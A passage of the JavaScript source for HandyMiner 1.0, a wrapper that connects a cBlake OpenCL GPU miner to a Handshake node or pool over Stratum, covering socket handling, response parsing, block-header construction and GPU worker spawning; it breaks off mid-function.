
/*
HANDYMINER 1.0
2019 Alex Smith <alex.smith@earthlab.tech>
A simple wrapper for cBlake OpenCL Miner
to communicate with Handshake HSD via Stratum (hstratum)

       _.-._        _.-._
     _| | | |      | | | |_
    | | | | |      | | | | |
    | | | | |      | | | | |
    | _.-'  | _  _ |  '-._ |
    ;_.-'.-'/`/  \`\`-.'-._;
    |   '    /    \    '   |
     \  '.  /      \  .`  /
      |    |        |    |

EPIC Thanks to chjj and the entire Handshake Project
EPIC Thanks to the Handshake Alliance for being a solid team
EPIC Thanks to Steven McKie for being my mentor/believing in me

*/
const fs = require('fs');
const net = require('net');

const {TX} = require('hsd').primitives;
const bio = require('bufio');
const {spawn,exec, execFile} = require('child_process');
const template = require('hsd/lib/mining/template.js'); //shim until hsd is updated
const merkle = require('hsd/lib/protocol/merkle.js');
const Headers = require('hsd/lib/primitives/headers.js');
const BLAKE2b256 = require('bcrypto/lib/blake2b256');
const {MerkleTree} = template;
const { consensus } = require("hsd");
const common = require('hsd/lib/mining/common.js');//require('./common.js');
const numeral = require('numeral');
const BN = require('bn.js');
const exitHook = require('exit-hook');
process.env.FORCE_COLOR = true;

let PlayWinningSound = true;

class HandyMiner {
	constructor(){
    //process.env.HANDYRAW=true;
    const config = JSON.parse(fs.readFileSync(__dirname+'/../config.json'));
    this.config = config;
    if(this.config.muteWinningFanfare){
        //I'd like not  to revel in the glory of getting a block...
        PlayWinningSound = false;
    }
    this.useStaticPoolDifficulty = false;
    this.poolDifficulty = 1000;
    if(typeof this.config.mode == 'undefined'){
      this.config.mode = 'solo'; //solo | pool
    }
    else{
      if(this.config.mode == 'pool'){
        //check for difficulty
        if(typeof this.config.poolDifficulty != "undefined"){
          this.poolDifficulty = parseFloat(this.config.poolDifficulty);
          this.useStaticPoolDifficulty = true;
        }
      }
    }
    this.minerIntensity = 0; //default
    this.intensitiesIndex = {};
    if(typeof this.config.intensity != "undefined"){
      this.minerIntensity = this.config.intensity;
    }
    this.isKilling = false;
    this.hasConnectionError = false;
    this.handleResponse = this.handleResponse.bind(this);
		this.targetID = "herpderpington_" + (new Date().getTime());
    this.altTargetID = "derpherpington_" + (new Date().getTime());
    this.registerID = this.targetID + '_register';
    this.altRegisterID = this.altTargetID + '_register';
    this.nonce1 = '00000000';
    this.nonce1Local = '00000000';
    this.nonce1Alt = '00000000';
    this.nonce2 = '00000000';
    this.host = config.host || '127.0.0.1';
    this.port = config.port || '3008';
    this.gpuListString = config.gpus || '-1';
    this.stratumUser = config.stratum_user || 'earthlab';
    if(typeof config.wallet != "undefined"){
      this.stratumUser = config.wallet+'_'+this.stratumUser;
    }
    this.stratumUserLocal = this.stratumUser;
    this.stratumPass = config.stratum_pass || 'earthlab'; //going to think this might be wallet?
    this.platformID = config.gpu_platform || '0';
    this.gpuWorkers = {};
    this.gpuNames = {};
    this.lastGPUHashrate = {};
    if(process.argv[2] == '-1'){
      this.gpuListString = '-1';
      if(process.argv[3]){
        this.platformID = process.argv[3];
      }
    }
    if(typeof process.env.TEMP == "undefined"){
      process.env.TEMP = '/tmp';
    }
    
    /*
    './miner/HandyMiner.js',
      this.config.gpus,
      this.config.gpu_platform,
      this.config.gpu_mfg,
      'authorize',
      this.hsdConfig.wallet,
      this.config.stratum_user,
      this.config.stratum_pass,
      this.config.host,
      this.config.port
    */
    if(process.argv[2] && process.argv[3] && process.argv[4]){

      this.gpuListString = process.argv[2];
      this.platformID = process.argv[3];
      this.config.gpus = this.gpuListString;
      this.config.gpu_platform = this.platformID;
      this.config.gpu_mfg = process.argv[4].toLowerCase();
    }
    if(process.argv[9] && process.argv[10]){
      this.host = process.argv[9];
      this.port = process.argv[10];

    }
    if(process.argv[11]){
      //intensity
      this.minerIntensity = process.argv[11];
    }
    if(process.argv[12]){
      //pool mode
      if(process.argv[12] == 'pool'){
        this.config.mode = 'pool';
      }
      if(process.argv[12] == 'solo'){
        this.config.mode = 'solo';
      }
    }
    if(process.argv[13]){
      //pool difficulty
      this.poolDifficulty = parseInt(process.argv[13]);
      this.useStaticPoolDifficulty = true;
    }
    if(process.argv[14]){
      //too many args sheesh
      //finally we mute fanfare
      let muteFanfare = parseInt(process.argv[14]) == 1 ? false : true;
      PlayWinningSound = muteFanfare;
    }
    this.propCalls = 1;
    this.gpuDeviceBlocks = {};
    this.isSubmitting = false;
    this.solutionCache = [];

    if(process.env.HANDYRAW){
      process.stdout.write(JSON.stringify({type:'stratumLog',data:'stratum will try to connect '+this.host+':'+this.port})+'\n')
    }
    else{
      console.log('\x1b[36mstratum will try to connect\x1b[0m'+this.host+':'+this.port);
    }
    if(!fs.existsSync(process.env.HOME+'/.HandyMiner')){
      fs.mkdirSync(process.env.HOME+'/.HandyMiner/');
    }
    if(!fs.existsSync(process.env.TEMP+'/HandyMiner')){
      fs.mkdirSync(process.env.TEMP+'/HandyMiner/');
    }
    if(!fs.existsSync(process.env.HOME+'/.HandyMiner/version.txt')){
      let myMin = Math.floor(Math.random()*59.999);
      fs.writeFileSync(process.env.HOME+'/.HandyMiner/version.txt',myMin);
    }
    let gpus = this.gpuListString.split(',').map(s=>{return s.trim();});
    let platform = this.platformID;
    gpus.map(gpuID=>{
      fs.writeFileSync(process.env.HOME+'/.HandyMiner/'+platform+'_'+gpuID+'.work',"");  
    })
    //fs.writeFileSync(process.env.HOME+'/.HandyMiner/miner.work',""); //clear the miner work buffer
    if(this.gpuListString == '-1'){
      this.spawnGPUWorker('-1',0);
      
    }
    this.startSocket();
    this.initListeners();
	}
  startAvgHashrateReporter(){


    let sumAll = 0;
    let sumAvgs = 0;
    
    if(typeof this.lastGPUReporterTimeout != "undefined"){
      clearTimeout(this.lastGPUReporterTimeout);
    }

    this.lastGPUReporterTimeout = setTimeout(()=>{
      Object.keys(this.lastGPUHashrate).map(k=>{
        sumAll += this.lastGPUHashrate[k].all;
        sumAvgs += this.lastGPUHashrate[k].avg;
      })
      console.log("\x1b[40;38;5;82mRIG HASHRATE\x1b[0m : \x1b[36m%s\x1b[40;38;5;82m RIG 120s AVG\x1b[0m : \x1b[36m%s\x1b[0m",numeral(sumAll).format('0.000b').replace('B','H'),numeral(sumAvgs).format('0.000b').replace('B','H'));
      this.startAvgHashrateReporter();
    },10000)
  }
  startSocket(){
    if(typeof this.server != "undefined"){
      try{
        this.server.destroy();
      }
      catch(e){

      }
    }
    this.server = net.createConnection({host:this.host,port:this.port},(socket)=>{
      this.server.setKeepAlive(true, 1000)

      if(process.env.HANDYRAW){
        process.stdout.write(JSON.stringify({type:'stratumLog',data:'stratum connected to '+this.host+':'+this.port})+'\n')
      }
      else{
        console.log('\x1b[36mstratum server is connected to\x1b[0m '+this.host+':'+this.port);
      }
      
      
      const stratumUsersFromArgs = this.getStratumUserPass();
      let stratumUser = stratumUsersFromArgs.user;
      let stratumPass = 'earthlab';//always leave blank and ser user as wallet //stratumUsersFromArgs.pass;
      this.stratumUser = stratumUser;
      this.stratumPass = stratumPass;
      //if(process.argv.indexOf('authorize') >= 0){
      //only need to call this first time
      if(process.env.HANDYRAW){
        process.stdout.write(JSON.stringify({type:'stratumLog',data:'Calling Miner Authorize'})+'\n')
      }
      else{
        console.log("\x1b[36mCALLING AUTHORIZE, CONGRATS\x1b[0m")
      
      }
      
      let callTS = new Date().getTime();
      //this is some admin user i think?
      const serverAdminPass = stratumUsersFromArgs.serverPass;
      this.server.write(JSON.stringify({"params": [serverAdminPass], "id": "init_"+callTS+"_user_"+stratumUser, "method": "mining.authorize_admin"})+'\n');
      
      this.server.write(JSON.stringify({"params": [stratumUser,stratumPass], "id": "init_"+callTS+"_user_"+stratumUser, "method": "mining.add_user"})+'\n');
      //}

      this.server.write(JSON.stringify({"id":this.targetID,"method":"mining.authorize","params":[stratumUser,stratumPass]})+"\n");
      this.server.write(JSON.stringify({"id":this.registerID,"method":"mining.subscribe","params":[]})+"\n");
      
      //kill connection when we kill the script. 
      //stratum TODO: gracefully handle messy deaths/disconnects from clients else it kills hsd atm.  
      exitHook(()=>{
        if(!process.env.HANDYRAW && this.gpuListString != '-1'){
          console.log('░░░░░░░░░░░░░░░░░░░░░░░░░░░░░');
          console.log('░░░░░░░░░░░░░\x1b[36m▄▄▄▄▄▄▄\x1b[0m░░░░░░░░░');
          console.log('░░░░░░░░░\x1b[36m▄▀▀▀░░░░░░░▀▄\x1b[0m░░░░░░░');
          console.log('░░░░░░░\x1b[36m▄▀░░░░░░░░░░░░▀▄\x1b[0m░░░░░░');
          console.log('░░░░░░\x1b[36m▄▀░░░░░░░░░░▄▀▀▄▀▄\x1b[0m░░░░░');
          console.log('░░░░\x1b[36m▄▀░░░░░░░░░░▄▀░░██▄▀▄\x1b[0m░░░░');
          console.log('░░░\x1b[36m▄▀░░▄▀▀▀▄░░░░█░░░▀▀░█▀▄\x1b[0m░░░');
          console.log('░░░\x1b[36m█░░█▄▄░░░█░░░▀▄░░░░░▐░█\x1b[0m░░░');
          console.log('░░\x1b[36m▐▌░░█▀▀░░▄▀░░░░░▀▄▄▄▄▀░░█\x1b[0m░░');
          console.log('░░\x1b[36m▐▌░░█░░░▄▀░░░░░░░░░░░░░░█\x1b[0m░░');
          console.log('░░\x1b[36m▐▌░░░▀▀▀░░░░░░░░░░░░░░░░▐▌\x1b[0m░');
          console.log('░░\x1b[36m▐▌░░░░░░░░░░░░░░░▄░░░░░░▐▌\x1b[0m░');
          console.log('░░\x1b[36m▐▌░░░░░░░░░▄░░░░░█░░░░░░▐▌\x1b[0m░');
          console.log('░░░\x1b[36m█░░░░░░░░░▀█▄░░▄█░░░░░░▐▌\x1b[0m░');
          console.log('░░░\x1b[36m▐▌░░░░░░░░░░▀▀▀▀░░░░░░░▐▌\x1b[0m░');
          console.log('░░░░\x1b[36m█░░░░░░░░░░░░░░░░░░░░░█\x1b[0m░░');
          console.log('░░░░\x1b[36m▐▌▀▄░░░░░░░░░░░░░░░░░▐▌\x1b[0m░░');
          console.log('░░░░░\x1b[36m█░░▀░░░░░░░░░░░░░░░░▀\x1b[0m░░░');
          console.log('░░░░░░░░░░░░░░░░░░░░░░░░░░░░░');
          console.log('░░░░░░\x1b[36mEXITING HANDYMINER\x1b[0m░░░░░');
          console.log('░░░░░░░░░░░░░░░░░░░░░░░░░░░░░');
        }
      })
      exitHook(()=>{

        //this.gpuWorker.kill();
        this.isKilling = true;
        Object.keys(this.gpuWorkers).map(k=>{
          this.gpuWorkers[k].stdin.pause();
          this.gpuWorkers[k].kill();
        });
        this.server.destroy();
        if(typeof this.mCheck != "undefined"){
          clearInterval(this.mCheck);
        }
        if(typeof this.checkTiming != "undefined"){
          clearTimeout(this.checkTiming);
        }
        if(typeof this.redundant != "undefined"){
          this.redundant.destroy();
        }

      })
    });
    let ongoingResp = '';
    this.server.on('data',(response)=>{
      //if(!this.isMGoing){
        this.hasConnectionError = false;
        ongoingResp = this.parseServerResponse(response,ongoingResp,true);
      //}
      
    });
    this.server.on('error',(response)=>{
      
      if(response.code == "ECONNREFUSED" && response.syscall == "connect" && !this.isKilling){
        
        if(process.env.HANDYRAW){
          process.stdout.write('{"type":"error","message":"STRATUM CONNECTION REFUSED, TRYING AGAIN IN 20s"}\n');
        }
        else{
          console.log("HANDY: STRATUM CONNECTION REFUSED, TRYING AGAIN IN 20s")
        }
        this.hasConnectionError = true;
      }
    });

    this.server.on('close',(response)=>{
      if(!this.isKilling && !this.hasConnectionError){
        //unplanned
        if(process.env.HANDYRAW){
          process.stdout.write(JSON.stringify({type:'error','message':'STRATUM CONNECTION WAS CLOSED. RECONNECTING NOW.'})+'\n');
        }
        else{
          console.log('HANDY:: server was closed!?!?!?!!!1! Reconnecting',this.isKilling);  
        }
        this.hasConnectionError = true;  
        this.startSocket();
        
      }
      if(this.hasConnectionError && !this.isKilling){
        //we had trouble connecting/reconnecting
        console.log('restart socket');
        if(typeof this.restartTimeout != "undefined"){
          clearTimeout(this.restartTimeout);
          delete this.restartTimeout;
        }
        this.restartTimeout = setTimeout(()=>{
          this.startSocket();
        },20000);
      }
      
    })
    this.server.on('timeout',(response)=>{

      //console.log('server timed out',response);
    })
  }
  parseServerResponse(response,ongoingResp,isLocalResponse){
    //parse stratum response.
    //simple, right? 
    //it'll naturall break up big reponses into multiple new line responses
    //conveniently we're hunting for json objs that are just newline separated
    //and of course there's a tailing comma returned in big objs, of course...
    //MASSIVELY ANNOYING TODO: ELIMINATE TRAILING COMMA IN BIG RESPONSES FROM STRATUM
    let resp = response.toString('utf8').split('\n');
    let didParse = true;
    //take care to check for empty lines
    resp = resp.filter((d)=>{
      return d.length > 1;
    }).map((d)=>{
      let ret = {};
      try{
        ret = JSON.parse(d);
        didParse = true;
      }
      catch(e){
        ongoingResp += resp;
        try{
          ret = JSON.parse(ongoingResp);
          didParse = true;
        }
        catch(e){
          //nope
          didParse = false;
            if(ongoingResp.slice(-2) == '},'){
              //wtf its adding a trailing comma?
              try{
                ret = JSON.parse(ongoingResp.slice(0,-1));
                didParse = true;
              }
              catch(e){
                try{
                  let last = ongoingResp.split('},');
                  last = last.filter(d=>{
                    return d.length > 1;
                  });

                  if(last.length > 1){
                    //ok get the last line
                    let len = ongoingResp.split('},').length;
                    last = last[last.length-1]+'}';
                    ret = JSON.parse(last);
                    didParse = true;
                  }
                  //ret = JSON.parse(ongoingResp.slice(0,-1))
                }
                catch(e){
                  console.log('ultimate failure!!!')
                  ret = ongoingResp;
                  ongoingResp = ''; //just effing reset it...
                  didParse = false;
                }
                console.log('ultimate fail')
                  
              }
            }
            
          
          
        }
      }
      if(didParse){
        ongoingResp = '';///reset

      }
      return ret;
    });
    //(!this.isMGoing){
    if((isLocalResponse && !this.isMGoing) || (!isLocalResponse && this.isMGoing)){
      this.handleResponse(resp);
    }
    //}
    //else{
    //if(this.isMGoing){
      //console.log('mining message',resp);
    resp.map((d)=>{
      switch(d.method){
        case 'mining.notify':
          if(this.isMGoing){
            this.lastLocalResponse = d;
            //this.refreshAllJobs();
          }
        break;
        case 'mining.set_difficulty':
          if(!this.isMGoing){
            if(!this.useStaticPoolDifficulty){
              this.poolDifficulty = parseFloat(d.params[0]);
              
              if(this.config.mode == 'pool'){
                this.refreshAllJobs();
              }
            }
          }
        break;
      }
      if(d.error != null && typeof d.method == "undefined"){
        if(d.error.length > 0){
          if(d.error[0] == 23){
            //high hash
            this.refreshOutstandingJobs();
            //this.refreshAllJobs();
          }
        }
      }
    });

    //}
    return ongoingResp;
  }
  dieGracefully(){

  }
  getStratumUserPass(){
    let user = this.stratumUser, pass = this.stratumPass;
    let stratumServerPass = this.stratumPass;
    if(process.argv.indexOf('authorize') >= 0){
      if(typeof process.argv[process.argv.indexOf('authorize')+1] != "undefined"){
        //we have username
        user = process.argv[process.argv.indexOf('authorize')+1];
      }
      if(typeof process.argv[process.argv.indexOf('authorize')+2] != "undefined"){
        //we have pass
        pass = process.argv[process.argv.indexOf('authorize')+2];
        stratumServerPass = process.argv[process.argv.indexOf('authorize')+2];
      }
      if(typeof process.argv[process.argv.indexOf('authorize')+3] != "undefined"){
        //we have pass
        stratumServerPass = process.argv[process.argv.indexOf('authorize')+3];
      }
    }
    return {user:user,pass:pass,serverPass:stratumServerPass};
  }
	handleResponse(JSONLineObjects){
		JSONLineObjects.map((d)=>{
			switch(d.method){
				case 'mining.notify':
					if(process.env.HANDYRAW){
            process.stdout.write(JSON.stringify({type:'stratumLog',data:'Received New Job From Stratum'})+'\n')
          }
          else{
            console.log("HANDY:: \x1b[36mJOB RECEIVED FROM STRATUM\x1b[0m")
          }
          if(!d.error){
            this.lastResponse = d;
            //console.log('we set last response from new response',d);  
          }
          if(!this.isMGoing){
            this.lastLocalResponse = d;
          }
          this.isSubmitting = false;
          this.solutionCache = [];
          if(Object.keys(this.gpuWorkers).length == 0){
            this.mineBlock(d);
          }
          else{
            this.notifyWorkers(d);
          }
          //this.mineBlock(d);
					
				break; //got some new jarbs or block
				case 'mining.set_difficulty':
					//TODO impl pool difficulty vs solo diff that we're using now
				break;
				case undefined:
          //console.log('result',d);
					if(d.id == this.targetID && !this.isMGoing){
						//in the case we pass back my id i know it's a message for me
            if(process.env.HANDYRAW){
              process.stdout.write(JSON.stringify({type:'stratumLog',data:'Successfully Registered With Stratum'})+'\n')
            }
            else{
              console.log("HANDY:: \x1b[36mREGISTERED WITH THE STRATUM\x1b[0m");
            }

					}
          else if(d.id == this.registerID){
            //we just registered
            if(d.error){
              if(d.error[1] == 'not up to date'){
                if(!process.env.HANDYRAW){
                    console.log("\x1b[31mHANDY:: STRATUM ERROR: "+d.error[1]+"\x1b[0m");
                }
                else{
                  process.stdout.write(JSON.stringify({type:'error',message:d.error[1],data:d}))
                }
              }
            }
            if(d.result == null && d.error != null){
              //was an error
              if(!process.env.HANDYRAW){
                  console.log("\x1b[31mHANDY:: STRATUM ERROR: "+d.error[1]+"\x1b[0m");
              }
              else{
                process.stdout.write(JSON.stringify({type:'error',message:d.error[1],data:d}))
              }
            }
            else{
              this.nonce1 = d.result[1];
              this.nonce1Local = d.result[1];
            }
          }
          else if(d.id == this.altRegisterID){
            this.nonce1 = d.result[1];
            this.nonce1Alt = d.result[1];
          }
          else if(typeof d.result != "undefined" && d.error == null && this.isSubmitting){
            //we found a block probably
            //console.log('submit result',d);
            this.isSubmitting = false;
            let granule = "BLOCK";
            if(this.config.mode == 'pool'){
              granule = 'SHARE';
            }
            if(!process.env.HANDYRAW && !this.isMGoing){
              
              console.log('\x1b[36mHANDY:: ACCEPTED '+granule+'! :::\x1b[0m ','\x1b[32;5;7m[̲̅$̲̅(̲̅Dο̲̅Ll͟a͟r͟y͟Dο̲̅ο̲̅)̲̅$̲̅]\x1b[0m');
            }
            else if(process.env.HANDYRAW && !this.isMGoing){
              
              process.stdout.write(JSON.stringify({type:'confirmation',granule:granule}));
            }
            if(process.platform.indexOf('linux') >= 0 && !this.isMGoing ){
              if(PlayWinningSound){
                try{
                  let s = spawn('aplay',[__dirname+'/winning.wav']);
                  s.stderr.on('data',(e)=>{
                    //didnt get to play sound, boo!
                  })
                  if(typeof this._sound != "undefined"){
                    this._sound.kill();
                  }
                  this._sound = s;
                }
                catch(e){
                  //no sound drivers here...

                }
              }
            }
            else{
                //were prob windowsy
                //powershell -c '(New-Object Media.SoundPlayer "C:\Users\earthlab\dev\HandyMinerMAY\miner\winning.wav").PlaySync()';
                if(process.platform.indexOf('win') == 0 && !this.isMGoing ){
                  if(PlayWinningSound){
                      let s = spawn('powershell.exe',['-c','(New-Object Media.SoundPlayer "'+__dirname+'\\winning.wav").PlaySync()']);
                      s.stderr.on('data',(e)=>{
                        //didnt get to play sound, boo!
                      })

                      if(typeof this._sound != "undefined"){
                        this._sound.kill();
                      }
                      this._sound = s;
                  }
                }
                if(process.platform.indexOf('darwin') >= 0 && !this.isMGoing ){
                  if(PlayWinningSound){
                      let s = spawn('afplay',[__dirname+'/winning.wav']);
                      s.stderr.on('data',(e)=>{
                        //didnt get to play sound, boo!
                      })
                      if(typeof this._sound != "undefined"){
                        this._sound.kill();
                      }
                      this._sound = s;
                  }  
                }
            }
            if(d.result && !this.isMGoing){
              if(process.env.HANDYRAW){
                process.stdout.write(JSON.stringify({type:'confirmation',message:'Received Confirmation Response',data:d})+'\n')
              }
              else{
                console.log('HANDY:: \x1b[36mCOMFIRMATION RESPONSE!\x1b[0m',d);
              }

              
              

            }
            if(!d.result && !this.isMGoing){
              if(process.env.HANDYRAW){
                process.stdout.write(JSON.stringify({type:'error',message:'problem with share', data: d})+'\n')
              }
              else{
                console.log('\x1b[36mHANDY::\x1b[0m PROBLEM WITH YOUR SHARE',d);
              }
              
            }
          }
          else{
            if(!process.env.HANDYRAW && Object.keys(d).length > 0 && !this.isMGoing){
              if(d.error != null){
                if(d.error[1] != 'User already exists.' && d.error[1] != 'high-hash'){
                  //yea dont care here
                  console.log('\x1b[36mSTRATUM EVENT LOG::\x1b[0m',d);
                }
                if(d.error[1] == 'high-hash'){
                  console.log("\x1b[36mSTRATUM EVENT LOG::\x1b[0m STALE SUBMIT");

                  //prob jumped the gun, lets generate work
                  this.generateWork();
                }
              }
              else{
                
                console.log('\x1b[36mSTRATUM EVENT LOG::\x1b[0m',d);
              }
            }
          }
				break;

				default:
          if(!process.env.HANDYRAW){
					 console.log('\x1b[36mSTRATUM EVENT LOG::\x1b[0m some unknown event happened!',d)
          }
				break;
			}
		})
	}
  notifyWorkers(){
    
    this.generateWork();
  }
	getBlockHeader(nonce2Override){
		const _this = this;
    const response = this.lastResponse;
    
    const jobID = response.params[0];
    const prevBlockHash = response.params[1];
    
    const merkleRoot = response.params[2];
    /*
    const left = response.params[2];
    const right = response.params[3];*/

    let nonce2 = this.nonce2;
    if(typeof nonce2Override != "undefined"){
      nonce2 = nonce2Override;
    }
    
    const witnessRoot = response.params[3]; 
    const treeRoot = response.params[4];
    const reservedRoot = response.params[5]; //these are prob all zeroes rn but here for future use
    const version = response.params[6];
    const bits = response.params[7];
    const time = response.params[8];
    
    let bt = new template.BlockTemplate();
    
    bt.prevBlock = Buffer.from(prevBlockHash,'hex');
    
    
    bt.treeRoot = Buffer.from(treeRoot,'hex');
    bt.version = parseInt(version,16);
    bt.time = parseInt(time,16);
    bt.bits = parseInt(bits,16);
    bt.witnessRoot = Buffer.from(witnessRoot,'hex');
    if(bt.bits == 0){
      console.log('uhoh bits are zero???');
    }
    try{
      bt.target = common.getTarget(bt.bits);
      bt.difficulty = common.getDifficulty(bt.target);
    }
    catch(e){
      console.error('error setting block pieces',response);
    }
    if(this.config.mode == 'pool' && !this.isMGoing){
      bt.difficulty = this.toDifficulty(bt.bits);
      let pooldiff = this.poolDifficulty;

      let newBits = this.targetFromDifficulty(pooldiff);
      let newDiff = this.toDifficulty(newBits);
      let newTarget = common.getTarget(newBits);

      /*console.log('newtarget',newTarget);
      console.log('newdiff',newDiff);
      console.log('pooldiff',pooldiff);
      console.log('block diff',bt.difficulty);
      */
      // bt.target = common.getTarget(bt.bits);
      bt.target = common.getTarget(newBits);
      
      
    }

    let hRoot = merkleRoot;
    bt.merkleRoot = hRoot;
    let nonce = Buffer.alloc(4, 0x00);
    let mask = consensus.ZERO_HASH;
    
    //const extraNonce = this.extraNonce;
    const exStr = Buffer.from(this.nonce1+nonce2,'hex');
    let extraNonce = consensus.ZERO_NONCE;
    for(var i=0;i<exStr.length;i++){
      extraNonce[i] = exStr[i];
    }
    bt.extraNonce = extraNonce;
    //console.log('extranonce isset',bt.extraNonce);
    bt.mask = mask;

    const hdrRaw = bt.getHeader(0, parseInt(time,16), extraNonce, mask);
    const hdr = Headers.fromMiner(hdrRaw);
    const data = hdr.toPrehead();
    const pad8 = hdr.padding(8);
    const pad32 = hdr.padding(32);
    const targetString = bt.target.toString('hex');
    return {
      jobID:jobID,
      time:time,
      header: data,
      pad8:pad8,
      pad32:pad32,
      rawHeader:hdrRaw,
      nonce:nonce,
      target: bt.target,
      nonce2: nonce2,
      blockTemplate:bt,
      mask:mask,
      extraNonce:extraNonce
    };
	}
  spawnGPUWorker(gpuID,gpuArrayI){

    let envVars = process.env;
    if(typeof envVars.TEMP == "undefined"){
      envVars.TEMP = '/tmp';
    }
    let executableFileName = './cBlakeMiner_AMD';
    let gpuMfg = this.config.gpu_mfg.toLowerCase() || 'nvidia';
    if(gpuMfg.indexOf(',') > 0){
      if(typeof gpuMfg.split(',')[gpuArrayI] != "undefined"){
        gpuMfg = gpuMfg.split(',')[gpuArrayI];
      }

    }
    let platformID = this.platformID;
    if(this.platformID.indexOf(',') > 0){
      if(typeof platformID.split(',')[gpuArrayI] != "undefined"){
        platformID = platformID.split(',')[gpuArrayI];
      }
    }

    if(process.platform.indexOf('darwin') >= 0){

    }
    if(process.platform.indexOf('linux') >= 0){
      executableFileName = './cBlakeMiner_multiPlatform_Linux';
    }
    else if (process.platform.indexOf('win') == 0){
      //its a windows box, lets adjust accordingly
      envVars.PATH = "C:\\Program\ Files\\mingw-w64\\x86_64-8.1.0-posix-seh-rt_v6-rev0\\bin"+';'+process.env.PATH;
      executableFileName = 'cBlakeMiner_multiPlatform.exe';
    }
    else{
      executableFileName = './cBlakeMiner_multiPlatform';
    }

    //spawn the miner child process 
    /*
      block.header.toString('hex').slice(0,-64),
      block.nonce.toString('hex'),
      block.target.toString('hex')
    */
    let miningMode = this.config.mode == 'pool' ? 1 : 0; // 0 = solo, 1 = pool
    let miner = spawn(executableFileName,[
        gpuID, //gpu's, -1 to list them
        platformID, //gpu platform
        gpuMfg, //gpu manufacturer
        miningMode
      ],{
      cwd: './core',//'C:/Users/camde/dev/sha3-opencl/add_numbers',
      env:envVars
      /*env: {
            PATH: "C:\\Program\ Files\\mingw-w64\\x86_64-8.1.0-posix-seh-rt_v6-rev0\\bin"+';'+process.env.PATH,
        }*/
    });
    this.gpuWorkers[gpuID] = miner;
    this.gpuWorkers[gpuID].stdin.write("registration\r\n");
    /*miner.stdin.on('data',(data)=> {
      console.log('miner stdin',data.toString('utf8'));
    })*/

    
    miner.stdout.on('data', (data) => {
      //console.log('miner stdout',data.toString('utf8'));
      let lastRespParams;
      if(this.gpuListString == '-1'){
        lastRespParams = 'bootstrap';
      }
      else{
        lastRespParams = this.lastResponse.params[0];
      }
      //console.log('miner stdout received',data.toString('utf8'));
      try{
        let json = JSON.parse(data.toString('utf8'));
        parseLines(lastRespParams,[json]);
      }
      catch(e){
        //console.log('caught E',e);
        //console.log('error parsing json',data.toString('utf8'))
        let rawLinesJSON = data.toString('utf8').split('\n');
        rawLinesJSON = rawLinesJSON.filter((d)=>{
          return d.length > 1;
        }).map((d)=>{
          d = d.trim();
          return JSON.parse(d);
        });
        parseLines(lastRespParams,rawLinesJSON);
      }
      
    });
    const _this = this;
    function parseLines(jobID,rawLinesJSON){
      let outJSON;
      let outStatus = [];
      let outRegistrations = [];
      let outs = rawLinesJSON.find((d)=>{
        return d.type == 'solution';
      });
      
      //check for status updates
      let statuses = rawLinesJSON.filter((d)=>{
        return d.type == 'status';
      });
      let getWorks = rawLinesJSON.filter((d)=>{
        return d.event == "getDeviceWork";
      });

      let fullNonces = rawLinesJSON.filter((d)=>{
        return d.event == 'nonceFull';
      });
      if(fullNonces.length > 0){
        fullNonces.map(function(d){
          _this.refreshJob(d);
        })
      }

      let logs = rawLinesJSON.filter((d)=>{
        
        return d.action == "log";
      });
      if(logs.length > 0){
        if(process.env.HANDYRAW){

          let gpuID = _this.gpuListString;

          logs = logs.map(line=>{
            if(typeof line.gpuid_set_work != "undefined"){
              gpuID = line.gpuid_set_work;
            }
            if(typeof line.gpuID != "undefined"){
              gpuID = line.gpuID;
            }
            line.gpuID = parseInt(gpuID);
            return line;
          });
          let logResp = {
            data:logs,
            type:'log'
          };
          
          process.stdout.write(JSON.stringify(logResp)+'\n');
        }
        else{
          if(JSON.stringify(logs).indexOf('kernel') >= 0){
            let gpuID = 0;
            logs.map(line=>{
                if(typeof line.gpuid_set_work != "undefined"){
                  gpuID = line.gpuid_set_work;
                }
            })
            console.log('\x1b[36mHANDY::\x1b[0m BUILDING OPENCL KERNEL FOR GPU ',gpuID);
            
            let amdMessage = '(for AMD cards).';
            
            console.log('\x1b[36mHANDY::\x1b[0m THIS WILL TAKE A MINUTE ',amdMessage);
          }
        }
        /*
        //these are mega annoying anyway
        else{
          console.log('\x1b[36mHANDY LOGS: \x1b[0m',logs);
        }*/
        

      }

      let deviceRegistrations = rawLinesJSON.filter((d)=>{
        return d.event == "registerDevice"; //device started work
      })
      
      if(statuses.length > 0){
        outStatus = statuses;
      }
      else{
        outStatus = [];
      }
      if(outs){
        
        outJSON = outs;
      }
      else{
        outJSON = {};
      }
      if(getWorks.length > 0){
        //_this.getDeviceWork(getWorks); //do nothing
      }
      if(deviceRegistrations.length > 0){
        outRegistrations = deviceRegistrations;
      }
      if(outStatus.length > 0){
        if(process.env.HANDYRAW){
          let statusResp = {
            data:outStatus,
            type:'status'
          };

          process.stdout.write(JSON.stringify(statusResp)+'\n');
        }
        else{
          outStatus.map(function(d){
            if(d.hashRate <= 3000000000){
              
              //if hashrate crosses over blocks it gets weird, like exahash...
              //so we just dont report if its too damn big per card rn...
              //TODO fix this rollover shite in the C code...
              console.log("HANDY:: \x1b[36mGPU %i (%s)\x1b[0m HASHRATE: \x1b[36m%s\x1b[0m 120s AVG: \x1b[36m%s\x1b[0m LASTNONCE: \x1b[36m0x%s\x1b[0m",d.gpuID,_this.gpuNames[d.gpuID+'_'+d.platformID],numeral(d.hashRate).format('0.000b').replace('B','H'),numeral(d.avg120sHashRate).format('0.000b').replace('B','H'), d.nonce.slice(0,16));
              _this.lastGPUHashrate[d.gpuID+'_'+d.platformID] = {
                all:d.hashRate,
                avg:d.avg120sHashRate
              }
            }
          });
          if(typeof _this.lastGPUReporterTimeout == "undefined"){
            _this.startAvgHashrateReporter();
          }

          
        }
        
      }
      if(outRegistrations.length > 0){
        if(process.env.HANDYRAW){
          let regResp = {
            data:outRegistrations,
            type:'registration'
          };
          process.stdout.write(JSON.stringify(regResp)+'\n');
        }
        else{
          if(_this.gpuListString == '-1'){
            console.log("\x1b[36m################### GPU LIST ######################\x1b[0m");
          }
          outRegistrations.map(function(d){
            let name = d.name;
            if(d.name == 'Ellesmere'){
              name = 'AMD RX**0';
            }
            if(d.name == 'gfx900'){
              name = 'AMD Vega'
            }
      	    if(d.name == 'gfx906'){
      	      name = 'AMD Vega-II';
      	    }
            if(d.name == 'gfx1010'){
              name = 'AMD Radeon 5700 XT';
            }
            if(d.name == 'gfx1000'){
              name = 'AMD Radeon 5700';
            }
            _this.gpuNames[d.id+'_'+d.platform] = name;
            if(_this.gpuListString == '-1'){
